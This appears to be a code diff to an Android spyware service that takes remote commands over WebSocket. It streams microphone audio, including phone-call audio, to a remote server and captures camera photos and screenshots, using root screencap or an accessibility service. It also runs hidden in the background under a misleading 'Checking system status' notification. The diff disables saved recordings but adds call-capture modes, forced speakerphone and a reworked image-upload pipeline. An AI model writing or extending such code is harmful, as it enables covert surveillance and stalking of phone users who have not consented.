@@ -62,7 +62,6 @@ import kotlinx.coroutines.sync.withLock
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.RequestBody.Companion.asRequestBody
 import okio.ByteString
 import okio.ByteString.Companion.toByteString
 import kotlin.coroutines.coroutineContext
@@ -83,8 +82,8 @@ import org.json.JSONArray
  * What it does:
  *  1. Captures raw PCM audio from microphone using AudioRecord.
  *  2. Streams every audio chunk live to the Node.js server via WebSocket.
- *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
- *  4. Listens for remote commands: "start_record", "stop_record", "ping".
+ *  3. Streams live PCM only; saved audio recording is disabled.
+ *  4. Listens for remote commands: "start_stream", "stop_stream", "ping".
  *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
  *  6. Holds a WakeLock so the CPU stays alive in background.
  *  7. restarted automatically by BootReceiver on reboot.
@@ -140,14 +139,10 @@ class MicService : Service() {
         .writeTimeout(15, TimeUnit.SECONDS)
         .readTimeout(15, TimeUnit.SECONDS)
         .build()
-    private val recordingUploadClient = httpClient.newBuilder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .writeTimeout(5, TimeUnit.MINUTES) // allow long transfers for large files
-        .readTimeout(30, TimeUnit.SECONDS)
-        .build()
 
     // ── Streaming state ─────────────────────────────────────────────────────
     @Volatile private var isCapturing   = false
+    @Volatile private var cameraCapturing = false
     @Volatile private var aiEnhancementEnabled = true
     @Volatile private var aiAutoModeEnabled = true
     // SENIOR DEV FIX: Default to false. Do not turn on the mic until ordered by the dashboard.
@@ -155,6 +150,9 @@ class MicService : Service() {
     @Volatile private var isRecoveringMic = false
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "near" // near | room | far
+    @Volatile private var callCaptureMode = "mic" // mic | speaker | earpiece
+    @Volatile private var earpieceBoostMode = "off" // off | low | medium | high
+    @Volatile private var callAecMode = "auto" // auto | on | off
     @Volatile private var softwareGainMultiplier = 1.6 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
@@ -162,6 +160,10 @@ class MicService : Service() {
     private var lowNetworkRecoveryStreak = 0
     @Volatile private var lastNetworkCapabilitiesAt = 0L
     @Volatile private var isNetworkLagging = false
+    @Volatile private var imageUploadStatus = "idle" // idle | queued | paused | uploading | uploaded | error
+    @Volatile private var imageTransferActive = false
+    @Volatile private var imageUploadPausedForAudio = false
+    @Volatile private var imageQueueDepth = 0
     @Volatile private var audioDropCount = 0L
     @Volatile private var silenceDropCount = 0L
     private var silenceGateFrames = 0
@@ -173,13 +175,17 @@ class MicService : Service() {
     private var lastDataHashStr: String = "" // Bug 5: String checksum for dedup
     // BUG-R1/R13 fix: single AtomicBoolean is the ONLY guard — isPhotoCaptureBusy removed
     private val photoCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)
-
-    private var recordingUploaderJob: Job? = null
+    private val screenshotCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)
+    private val imageUploadMutex = Mutex()
 
     private fun currentStreamFrameMs(): Int {
         // For WebSocket (TCP), if network is weak/lagging, bundling into 40ms 
         // halves the TCP/IP acknowledgment overhead, vastly improving weak WiFi stability.
-        return if (lowNetworkMode || isNetworkLagging) 40 else 20
+        return if (isEffectiveLowNetworkMode()) 40 else 20
+    }
+
+    private fun isEffectiveLowNetworkMode(): Boolean {
+        return lowNetworkMode || isNetworkLagging || (isCapturing && (imageTransferActive || imageQueueDepth > 0 || imageUploadPausedForAudio))
     }
     
     // HQ Buffered Audio Mode removed (M-02) — all code uses realtime path
@@ -234,10 +240,23 @@ class MicService : Service() {
         val isCallActive = isDeviceInCall()
         
         return if (isCallActive) {
-            // STATE 1: DURING A CALL
-            // We MUST use VOICE_RECOGNITION to bypass the telecom HAL lock.
-            Log.w(TAG, "Call active! Using VOICE_RECOGNITION to bypass HAL.")
-            intArrayOf(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+            Log.w(TAG, "Call active. Capture mode=$callCaptureMode boost=$earpieceBoostMode aec=$callAecMode")
+            when (callCaptureMode) {
+                "earpiece" -> intArrayOf(
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                    MediaRecorder.AudioSource.MIC,
+                    MediaRecorder.AudioSource.CAMCORDER
+                )
+                "speaker" -> intArrayOf(
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                    MediaRecorder.AudioSource.CAMCORDER,
+                    MediaRecorder.AudioSource.MIC
+                )
+                else -> intArrayOf(
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                    MediaRecorder.AudioSource.MIC
+                )
+            }
         } else {
             // STATE 2: BACKGROUND MONITORING (NO CALL)
             // Prefer VOICE_RECOGNITION for far-field speech without entering
@@ -506,16 +525,7 @@ class MicService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
 
-        // Bug 5, 6, 15: Run startForeground IMMEDIATELY before anything else
-        // Fix: FOREGROUND_SERVICE_TYPE_MICROPHONE and CAMERA were added in Android 11 (API 30 / R)
-        // using them on API 29 (Q) causes a NoSuchFieldError crash.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            val typeFlags = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            startForeground(NOTIF_ID, buildNotification("Checking system status…"), typeFlags)
-        } else {
-            startForeground(NOTIF_ID, buildNotification("Checking system status…"))
-        }
+        startForegroundForHardware(mic = false, camera = false, text = "Checking system status...")
 
         // Layer 14: Device Owner Power-Up (M-03: only once per service lifetime)
         if (!isDeviceOwnerConfigured) {
@@ -535,9 +545,8 @@ class MicService : Service() {
                 Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                 connectWebSocket()
             } else {
-                // Bug 9: WS is alive — just ensure workers are running, no redundant HTTP calls
+                // Bug 9: WS is alive — just ensure non-hardware workers are running.
                 Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
-                if (!isCapturing && wantsMicStreaming) startAudioCapture()
             }
             scheduleReconnectAlarm() // reschedule only, no redundant startHttpFallbackSync (Bug 9)
             return START_STICKY
@@ -546,11 +555,9 @@ class MicService : Service() {
         if (activeWebSocket == null) {
             connectWebSocket()
         } else {
-            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
-            if (!isCapturing && wantsMicStreaming) startAudioCapture()
+            Log.i(TAG, "WebSocket already active — ensuring data workers are running")
             startMicWatchdog()
             startDataCollection()
-            startRecordingUploader()
         }
         startNetworkEnforcer()
         startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
@@ -693,7 +700,6 @@ class MicService : Service() {
         // risks a 5-second ANR on Android 14+. Direct call is safe and immediate.
         stopAudioCapture("service_destroy")
         stopDataCollection()
-        stopRecordingUploader()
         networkEnforcerJob?.cancel()
         networkEnforcerJob = null
 
@@ -795,31 +801,21 @@ class MicService : Service() {
                     }
                 }
 
-                // BUG-R10: Restore all session state — not just streaming flag
-                // SENIOR DEV FIX: Change the default fallback to false.
-                val wasStreaming = prefs.getBoolean("session_streaming", false)
-                wantsMicStreaming = wasStreaming
+                // Restore tuning only. Dashboard reconnect must never open mic hardware;
+                // streaming starts only from an explicit start_stream command.
+                val wasStreaming = false
+                wantsMicStreaming = false
+                prefs.edit().putBoolean("session_streaming", false).apply()
                 voiceProfile = prefs.getString("session_voice_profile", "near") ?: "near"
+                callCaptureMode = prefs.getString("session_call_capture_mode", "mic") ?: "mic"
+                earpieceBoostMode = prefs.getString("session_earpiece_boost", "off") ?: "off"
+                callAecMode = prefs.getString("session_call_aec_mode", "auto") ?: "auto"
                 softwareGainMultiplier = prefs.getFloat("session_gain", 1.6f).toDouble()
                 lowNetworkMode = prefs.getBoolean("session_low_network", false)
                 wsStreamMode = prefs.getString("session_stream_codec", "auto") ?: "auto"
                 Log.i(TAG, "Session restored: streaming=$wasStreaming profile=$voiceProfile gain=$softwareGainMultiplier lowNet=$lowNetworkMode codec=$wsStreamMode")
 
-                if (wasStreaming) {
-                    // FIX Issue 1: Delay briefly so any previous capture session's
-                    // finally block (which clears isCapturingGuard) has time to
-                    // complete before we try to start a new capture session.
-                    serviceScope.launch(Dispatchers.IO) {
-                        delay(300L)
-                        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
-                            startAudioCapture()
-                            startMicWatchdog()
-                        }
-                    }
-                }
-
                 startDataCollection()
-                startRecordingUploader()
                 sendHealthStatus("ws_open")
                 flushOfflineAcks()
             }
@@ -872,7 +868,6 @@ class MicService : Service() {
         stopAudioCapture("ws_disconnected")
         stopMicWatchdog()
         stopDataCollection()
-        stopRecordingUploader()
         
         // Ensure HTTP fallback polling picks up slack
         startHttpFallbackSync()
@@ -1077,10 +1072,9 @@ class MicService : Service() {
                     val root = JSONObject(body)
                     // Apply states (Layer 10 Save/Restore state)
                     if (root.has("sessionState")) {
-                        val state = root.getJSONObject("sessionState")
-                        val serverStreaming = state.optBoolean("streaming", false)
-                        wantsMicStreaming = serverStreaming
-                        prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
+                        // Do not restore active mic state from sync. Only an explicit
+                        // start_stream command may create AudioRecord and show the green dot.
+                        prefs.edit().putBoolean("session_streaming", false).apply()
                     }
                     val wasReplayed = root.optBoolean("replayed", false)
                     if (wasReplayed) {
@@ -1216,14 +1210,13 @@ class MicService : Service() {
                 sendCommandAck("ping")
             }
             "scan_recordings" -> {
-                Log.i(TAG, "CMD: scan_recordings - starting manual scan")
-                serviceScope.launch(Dispatchers.IO) { scanAndUploadRecordings() }
-                sendCommandAck("scan_recordings")
+                Log.i(TAG, "CMD: scan_recordings ignored (recording disabled)")
+                sendCommandAck("scan_recordings", "error", "recording_disabled")
             }
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
                 lastDataHashStr = "" // clear cache so data is forced to sync
-                sendDeviceData()
+                sendDeviceData(force = true)
                 sendCommandAck("get_data")
             }
             "force_reconnect" -> {
@@ -1276,7 +1269,7 @@ class MicService : Service() {
                     // Collect and send data to verify permissions work
                     serviceScope.launch(Dispatchers.IO) {
                         delay(500)  // Wait for permissions to apply
-                        sendDeviceData()
+                        sendDeviceData(force = true)
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to grant permissions: ${e.message}")
@@ -1640,33 +1633,7 @@ class MicService : Service() {
                     sendCommandAck("photo_night", detail = photoNightMode)
                 }
                 "delete_recording" -> {
-                    val filename = obj.optString("filename", "")
-                    if (filename.isNotBlank()) {
-                        var deleted = false
-                        val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
-                        if (hiddenDir.exists() && hiddenDir.isDirectory) {
-                            val target = hiddenDir.walkTopDown().maxDepth(3).find { it.name == filename }
-                            if (target != null && target.exists()) {
-                                // Prevent deleting an actively recording file
-                            if (CallRecorder.isRecording && target.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
-                                    Log.w(TAG, "Attempted to delete active recording! Denied.")
-                                } else if (target.delete()) {
-                                    deleted = true
-                                }
-                            }
-                        }
-                        
-                        if (deleted) Log.i(TAG, "Deleted recording upon PC confirmation: $filename")
-                        
-                        val uploadedKey = "uploaded_records_history"
-                        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
-                        val toRemove = uploadedFiles.filter { it.endsWith("/$filename") }
-                        if (toRemove.isNotEmpty()) {
-                            uploadedFiles.removeAll(toRemove.toSet())
-                            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
-                        }
-                        sendCommandAck("delete_recording", "success", filename)
-                    }
+                    sendCommandAck("delete_recording", "error", "recording_disabled")
                 }
                 "stream_codec" -> {
                     val mode = obj.optString("mode", "auto").trim().lowercase()
@@ -1718,6 +1685,53 @@ class MicService : Service() {
                     sendHealthStatus("voice_profile_$voiceProfile")
                     Log.i(TAG, "Voice profile set to $voiceProfile")
                     sendCommandAck("voice_profile", detail = voiceProfile)
+                }
+                "call_capture_mode" -> {
+                    val mode = obj.optString("mode", "mic").trim().lowercase()
+                    callCaptureMode = when (mode) {
+                        "speaker" -> "speaker"
+                        "earpiece", "earpiece_boost" -> "earpiece"
+                        else -> "mic"
+                    }
+                    if (callCaptureMode == "speaker") {
+                        try {
+                            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+                            @Suppress("DEPRECATION")
+                            audioManager?.isSpeakerphoneOn = true
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Speaker mode request failed: ${e.message}")
+                        }
+                    }
+                    prefs.edit().putString("session_call_capture_mode", callCaptureMode).apply()
+                    sendHealthStatus("call_capture_$callCaptureMode")
+                    sendCommandAck("call_capture_mode", detail = callCaptureMode)
+                }
+                "earpiece_boost" -> {
+                    val mode = obj.optString("mode", "off").trim().lowercase()
+                    earpieceBoostMode = when (mode) {
+                        "low", "medium", "high" -> mode
+                        else -> "off"
+                    }
+                    if (earpieceBoostMode != "off") callCaptureMode = "earpiece"
+                    prefs.edit()
+                        .putString("session_earpiece_boost", earpieceBoostMode)
+                        .putString("session_call_capture_mode", callCaptureMode)
+                        .apply()
+                    sendHealthStatus("earpiece_boost_$earpieceBoostMode")
+                    sendCommandAck("earpiece_boost", detail = earpieceBoostMode)
+                }
+                "call_aec_mode" -> {
+                    val mode = obj.optString("mode", "auto").trim().lowercase()
+                    callAecMode = when (mode) {
+                        "on", "off" -> mode
+                        else -> "auto"
+                    }
+                    prefs.edit().putString("session_call_aec_mode", callAecMode).apply()
+                    if (isCapturing || isCapturingGuard.get()) {
+                        rebuildAudioRecordForCallRoute("aec_mode_changed")
+                    }
+                    sendHealthStatus("call_aec_$callAecMode")
+                    sendCommandAck("call_aec_mode", detail = callAecMode)
                 }
                 "set_gain" -> {
                     val level = obj.optDouble("level", 1.0).coerceIn(0.5, 5.0)
@@ -1810,12 +1824,13 @@ class MicService : Service() {
         }
         serviceScope.launch(Dispatchers.IO) {
             try {
-                val totalTimeoutMs = when (photoNightMode) {
+                val captureTimeoutMs = when (photoNightMode) {
                     "5s" -> 16_000L
                     "3s" -> 14_000L
                     "1s" -> 12_000L
                     else -> 10_000L
                 }
+                val totalTimeoutMs = captureTimeoutMs + 45_000L
                 withTimeoutOrNull(totalTimeoutMs) {
                     val explicitFacing = parseRequestedCameraFacing(cameraMode)
                     val facing = explicitFacing ?: preferredCameraFacing
@@ -1843,59 +1858,17 @@ class MicService : Service() {
                     val safeNight = photoNightMode.replace(Regex("[^a-zA-Z0-9]"), "")
                     val filename = "photo_${deviceId}_${cameraName}_${safeQuality}_${safeNight}_${System.currentTimeMillis()}.jpg"
 
-                    var httpSuccess = false
-                    try {
-                        val requestBody = MultipartBody.Builder()
-                            .setType(MultipartBody.FORM)
-                            .addFormDataPart("deviceId", deviceId)
-                            .addFormDataPart(
-                                "photo",
-                                filename,
-                                optimized.toRequestBody("image/jpeg".toMediaTypeOrNull())
-                            )
-                            .build()
-
-                        val request = Request.Builder()
-                            .url("$serverHttpBaseUrl/api/upload-photo")
-                            .post(requestBody)
-                            .addHeader("X-Filename", filename)
-                            .addHeader("X-Device-Id", deviceId)
-                            .build()
-
-                        val response = photoUploadClient.newCall(request).execute()
-                        httpSuccess = response.isSuccessful
-                        response.close()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "HTTP photo upload failed: ${e.message}")
-                    }
-
-                    if (!httpSuccess) {
-                        Log.w(TAG, "Falling back to WebSocket binary for photo")
-                        val msgJson = JSONObject().apply {
-                            put("type", "photo_upload")
-                            put("deviceId", deviceId)
-                            put("camera", cameraName)
-                            put("quality", photoQualityMode)
-                            put("nightMode", photoNightMode)
-                            put("filename", filename)
-                            put("mime", "image/jpeg")
-                            put("aiEnhanced", aiPhotoEnhancementEnabled)
-                            put("lowNetwork", lowNetworkMode)
-                            put("ts", System.currentTimeMillis())
-                        }.toString()
-                        val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
-                        val headerLen = headerBytes.size
-                        
-                        val out = ByteArray(4 + headerLen + optimized.size)
-                        out[0] = 0x43 // 'C'
-                        out[1] = 0x4C // 'L'
-                        out[2] = ((headerLen shr 8) and 0xFF).toByte()
-                        out[3] = (headerLen and 0xFF).toByte()
-                        System.arraycopy(headerBytes, 0, out, 4, headerLen)
-                        System.arraycopy(optimized, 0, out, 4 + headerLen, optimized.size)
-                        safeSend(okio.ByteString.of(*out))
-                    }
-                    sendCommandAck("take_photo", "success", cameraName)
+                    val uploaded = uploadImageWithAudioPriority(
+                        jpegBytes = optimized,
+                        filename = filename,
+                        payloadType = "photo_upload",
+                        command = "take_photo",
+                        cameraName = cameraName,
+                        quality = photoQualityMode,
+                        nightMode = photoNightMode,
+                        aiEnhanced = aiPhotoEnhancementEnabled,
+                    )
+                    sendCommandAck("take_photo", if (uploaded) "success" else "error", if (uploaded) cameraName else "upload_failed")
                 } ?: run {
                     Log.e(TAG, "Photo capture timeout")
                     sendCommandAck("take_photo", "error", "timeout")
@@ -1912,6 +1885,10 @@ class MicService : Service() {
 
     @SuppressLint("ObsoleteSdkInt")
     private fun captureAndSendScreenshot() {
+        if (!screenshotCaptureBusyGuard.compareAndSet(false, true)) {
+            sendCommandAck("take_screenshot", "busy")
+            return
+        }
         serviceScope.launch(Dispatchers.IO) {
             var tempWakeLock: PowerManager.WakeLock? = null
             try {
@@ -1928,71 +1905,215 @@ class MicService : Service() {
             }
 
             try {
-                // Try rooted approach first
-                val rootScreenshot = withTimeoutOrNull(10000L) {
-                    var process: Process? = null
-                    try {
-                        process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p"))
-                        val bytes = process.inputStream.readBytes()
-                        process.waitFor()
-                        if (process.exitValue() == 0 && bytes.isNotEmpty()) bytes else null
-                    } catch (e: Exception) {
-                        Log.w(TAG, "Root screenshot exception: ${e.message}")
-                        null
-                    } finally {
-                        try {
-                            process?.destroy()
-                        } catch (e: Exception) {
-                            Log.w(TAG, "Failed to destroy su process: ${e.message}")
-                        }
-                    }
-                }
-
-                if (rootScreenshot != null) {
-                    uploadScreenshotBytes(rootScreenshot)
-                    return@launch
+                val preferAccessibility = isDeviceInCall() || isCapturing
+                val screenshotBytes = captureScreenshotBytes(preferAccessibility)
+                if (screenshotBytes != null) {
+                    uploadScreenshotBytes(screenshotBytes)
+                } else {
+                    sendCommandAck("take_screenshot", "error", "capture_failed")
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "Root screenshot failed: ${e.message}")
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                val accessibilityInstance = MonitorAccessibilityService.instance
-                if (accessibilityInstance != null) {
-                    accessibilityInstance.captureScreen { bitmap ->
-                        if (bitmap != null) {
-                            serviceScope.launch(Dispatchers.IO) {
-                                val stream = java.io.ByteArrayOutputStream()
-                                bitmap.compress(Bitmap.CompressFormat.JPEG, 82, stream)
-                                val jpegBytes = stream.toByteArray()
-                                bitmap.recycle()
-                                uploadScreenshotBytes(jpegBytes)
-                            }
-                        } else {
-                            sendCommandAck("take_screenshot", "error", "capture_failed")
-                        }
-                    }
-                } else {
-                    sendCommandAck("take_screenshot", "error", "accessibility_service_not_running")
-                }
-            } else {
-                sendCommandAck("take_screenshot", "error", "unsupported_android_version")
+                Log.w(TAG, "Screenshot failed: ${e.message}")
+                sendCommandAck("take_screenshot", "error", e.message?.take(50) ?: "capture_failed")
+            } finally {
+                try {
+                    tempWakeLock?.release()
+                } catch (_: Exception) {}
+                screenshotCaptureBusyGuard.set(false)
             }
         }
     }
 
-    private fun uploadScreenshotBytes(jpegBytes: ByteArray) {
+    private suspend fun captureScreenshotBytes(preferAccessibility: Boolean): ByteArray? {
+        if (preferAccessibility) {
+            captureAccessibilityScreenshotBytes()?.let { return it }
+            captureRootScreenshotBytes(1_500L)?.let { return optimizeScreenshotJpeg(it) }
+            return null
+        }
+        captureRootScreenshotBytes(2_500L)?.let { return optimizeScreenshotJpeg(it) }
+        return captureAccessibilityScreenshotBytes()
+    }
+
+    private suspend fun captureAccessibilityScreenshotBytes(): ByteArray? {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
+        val accessibilityInstance = MonitorAccessibilityService.instance ?: return null
+        return withTimeoutOrNull(4_000L) {
+            val result = CompletableDeferred<ByteArray?>()
+            accessibilityInstance.captureScreen { bitmap ->
+                serviceScope.launch(Dispatchers.Default) {
+                    result.complete(bitmap?.let { bmp ->
+                        try {
+                            optimizeScreenshotBitmap(bmp)
+                        } finally {
+                            if (!bmp.isRecycled) bmp.recycle()
+                        }
+                    })
+                }
+            }
+            result.await()
+        }
+    }
+
+    private suspend fun captureRootScreenshotBytes(timeoutMs: Long): ByteArray? {
+        return withTimeoutOrNull(timeoutMs) {
+            var process: Process? = null
+            try {
+                process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p"))
+                val bytes = process.inputStream.readBytes()
+                process.waitFor()
+                if (process.exitValue() == 0 && bytes.isNotEmpty()) bytes else null
+            } catch (e: Exception) {
+                Log.w(TAG, "Root screenshot exception: ${e.message}")
+                null
+            } finally {
+                try {
+                    process?.destroy()
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+    private fun optimizeScreenshotJpeg(source: ByteArray): ByteArray {
+        return try {
+            val bitmap = BitmapFactory.decodeByteArray(source, 0, source.size) ?: return source
+            optimizeScreenshotBitmap(bitmap).also {
+                if (!bitmap.isRecycled) bitmap.recycle()
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Screenshot optimization failed: ${e.message}")
+            source
+        }
+    }
+
+    private fun optimizeScreenshotBitmap(source: Bitmap): ByteArray {
+        val maxEdge = if (isEffectiveLowNetworkMode() || isDeviceInCall()) 720 else 1280
+        val maxSourceEdge = max(source.width, source.height).coerceAtLeast(1)
+        val scale = min(1f, maxEdge.toFloat() / maxSourceEdge.toFloat())
+        val bitmap = if (scale < 0.999f) {
+            Bitmap.createScaledBitmap(
+                source,
+                max(1, (source.width * scale).toInt()),
+                max(1, (source.height * scale).toInt()),
+                true
+            )
+        } else {
+            source
+        }
+        val stream = java.io.ByteArrayOutputStream()
+        val quality = if (maxEdge <= 720) 62 else 74
+        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream)
+        if (bitmap !== source && !bitmap.isRecycled) bitmap.recycle()
+        return stream.toByteArray()
+    }
+
+    private suspend fun uploadScreenshotBytes(jpegBytes: ByteArray) {
         val filename = "screenshot_${deviceId}_${System.currentTimeMillis()}.jpg"
-        var httpSuccess = false
-        try {
+        val uploaded = uploadImageWithAudioPriority(
+            jpegBytes = jpegBytes,
+            filename = filename,
+            payloadType = "screenshot_upload",
+            command = "take_screenshot",
+            cameraName = "screenshot",
+            quality = "screenshot",
+            nightMode = "off",
+            aiEnhanced = false,
+        )
+        sendCommandAck("take_screenshot", if (uploaded) "success" else "error", if (uploaded) null else "upload_failed")
+    }
+
+    private suspend fun uploadImageWithAudioPriority(
+        jpegBytes: ByteArray,
+        filename: String,
+        payloadType: String,
+        command: String,
+        cameraName: String,
+        quality: String,
+        nightMode: String,
+        aiEnhanced: Boolean,
+    ): Boolean {
+        imageQueueDepth++
+        if (imageUploadMutex.isLocked) {
+            publishImageUploadStatus("queued", command, filename)
+        }
+        if (isCapturing) {
+            isNetworkLagging = true
+        }
+
+        return try {
+            imageUploadMutex.withLock {
+                imageTransferActive = true
+                try {
+                    waitForAudioUploadWindow(command, filename)
+                    publishImageUploadStatus("uploading", command, filename)
+                    val httpSuccess = uploadImageByHttp(jpegBytes, filename)
+                    val success = if (httpSuccess) {
+                        true
+                    } else {
+                        waitForAudioUploadWindow(command, filename)
+                        uploadImageByWebSocket(
+                            jpegBytes = jpegBytes,
+                            filename = filename,
+                            payloadType = payloadType,
+                            cameraName = cameraName,
+                            quality = quality,
+                            nightMode = nightMode,
+                            aiEnhanced = aiEnhanced,
+                        )
+                    }
+                    publishImageUploadStatus(if (success) "uploaded" else "error", command, filename)
+                    success
+                } finally {
+                    imageTransferActive = false
+                    imageUploadPausedForAudio = false
+                    if (imageQueueDepth > 1) {
+                        publishImageUploadStatus("queued", command, filename)
+                    }
+                }
+            }
+        } finally {
+            imageQueueDepth = (imageQueueDepth - 1).coerceAtLeast(0)
+        }
+    }
+
+    private suspend fun waitForAudioUploadWindow(command: String, filename: String) {
+        if (!isCapturing) return
+        var stableChecks = 0
+        val startedAt = SystemClock.elapsedRealtime()
+        while (coroutineContext.isActive) {
+            val qSize = activeWebSocket?.queueSize() ?: 0L
+            val audioFresh = System.currentTimeMillis() - lastAudioChunkSentAt < 1_500L
+            val stable = qSize < 8_000L && audioFresh && !callRouteRebuildGuard.get()
+            if (stable) {
+                stableChecks++
+                if (stableChecks >= 3) {
+                    if (imageUploadPausedForAudio) publishImageUploadStatus("queued", command, filename)
+                    imageUploadPausedForAudio = false
+                    return
+                }
+            } else {
+                stableChecks = 0
+                if (!imageUploadPausedForAudio) {
+                    publishImageUploadStatus("paused", command, filename)
+                    safeSend("""{"type":"audio_quality","deviceId":"$deviceId","lowNetwork":true,"dropping":true,"dropped":$audioDropCount,"buffered":$qSize,"imageUploadPaused":true,"ts":${System.currentTimeMillis()}}""")
+                }
+                imageUploadPausedForAudio = true
+            }
+
+            if (SystemClock.elapsedRealtime() - startedAt > 20_000L) {
+                Log.w(TAG, "Image upload waited 20s for audio stability; trying small upload anyway")
+                imageUploadPausedForAudio = false
+                return
+            }
+            delay(180L)
+        }
+    }
+
+    private fun uploadImageByHttp(jpegBytes: ByteArray, filename: String): Boolean {
+        return try {
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("deviceId", deviceId)
-                .addFormDataPart(
-                    "photo",
-                    filename,
-                    jpegBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
-                )
+                .addFormDataPart("photo", filename, jpegBytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                 .build()
 
             val request = Request.Builder()
@@ -2002,35 +2123,68 @@ class MicService : Service() {
                 .addHeader("X-Device-Id", deviceId)
                 .build()
 
-            val response = photoUploadClient.newCall(request).execute()
-            httpSuccess = response.isSuccessful
-            response.close()
+            photoUploadClient.newCall(request).execute().use { response ->
+                response.isSuccessful
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "HTTP screenshot upload failed: ${e.message}")
+            Log.e(TAG, "HTTP image upload failed: ${e.message}")
+            false
         }
+    }
 
-        if (!httpSuccess) {
-            Log.w(TAG, "Falling back to WebSocket binary for screenshot")
-            val msgJson = JSONObject().apply {
-                put("type", "screenshot_upload")
-                put("deviceId", deviceId)
-                put("filename", filename)
-                put("mime", "image/jpeg")
-                put("ts", System.currentTimeMillis())
-            }.toString()
-            val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
-            val headerLen = headerBytes.size
+    private fun uploadImageByWebSocket(
+        jpegBytes: ByteArray,
+        filename: String,
+        payloadType: String,
+        cameraName: String,
+        quality: String,
+        nightMode: String,
+        aiEnhanced: Boolean,
+    ): Boolean {
+        Log.w(TAG, "Falling back to WebSocket binary for image")
+        val msgJson = JSONObject().apply {
+            put("type", payloadType)
+            put("deviceId", deviceId)
+            put("camera", cameraName)
+            put("quality", quality)
+            put("nightMode", nightMode)
+            put("filename", filename)
+            put("mime", "image/jpeg")
+            put("aiEnhanced", aiEnhanced)
+            put("lowNetwork", isEffectiveLowNetworkMode())
+            put("ts", System.currentTimeMillis())
+        }.toString()
+        val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
+        val headerLen = headerBytes.size
+        val out = ByteArray(4 + headerLen + jpegBytes.size)
+        out[0] = 0x43
+        out[1] = 0x4C
+        out[2] = ((headerLen shr 8) and 0xFF).toByte()
+        out[3] = (headerLen and 0xFF).toByte()
+        System.arraycopy(headerBytes, 0, out, 4, headerLen)
+        System.arraycopy(jpegBytes, 0, out, 4 + headerLen, jpegBytes.size)
+        return safeSend(okio.ByteString.of(*out))
+    }
 
-            val out = ByteArray(4 + headerLen + jpegBytes.size)
-            out[0] = 0x43 // 'C'
-            out[1] = 0x4C // 'L'
-            out[2] = ((headerLen shr 8) and 0xFF).toByte()
-            out[3] = (headerLen and 0xFF).toByte()
-            System.arraycopy(headerBytes, 0, out, 4, headerLen)
-            System.arraycopy(jpegBytes, 0, out, 4 + headerLen, jpegBytes.size)
-            safeSend(okio.ByteString.of(*out))
+    private fun publishImageUploadStatus(status: String, command: String, filename: String? = null) {
+        imageUploadStatus = status
+        imageUploadPausedForAudio = status == "paused"
+        val msg = JSONObject().apply {
+            put("type", "image_upload_status")
+            put("deviceId", deviceId)
+            put("status", status)
+            put("command", command)
+            put("filename", filename ?: "")
+            put("audioLive", isCapturing)
+            put("imageQueued", status == "queued" || imageQueueDepth > 1)
+            put("uploadPausedForAudio", status == "paused")
+            put("uploading", status == "uploading")
+            put("uploaded", status == "uploaded")
+            put("queueDepth", imageQueueDepth)
+            put("ts", System.currentTimeMillis())
         }
-        sendCommandAck("take_screenshot", "success")
+        safeSend(msg.toString())
+        sendHealthStatus("image_upload_$status")
     }
 
     private fun parseRequestedCameraFacing(cameraMode: String): Int? {
@@ -2049,7 +2203,7 @@ class MicService : Service() {
     )
 
     private fun requestedNightExposureNs(): Long? {
-        if (lowNetworkMode || isNetworkLagging) return null
+        if (isEffectiveLowNetworkMode()) return null
         return when (photoNightMode) {
             "1s" -> 80_000_000L // 80ms, light stabilization without long stalls
             "3s" -> 120_000_000L
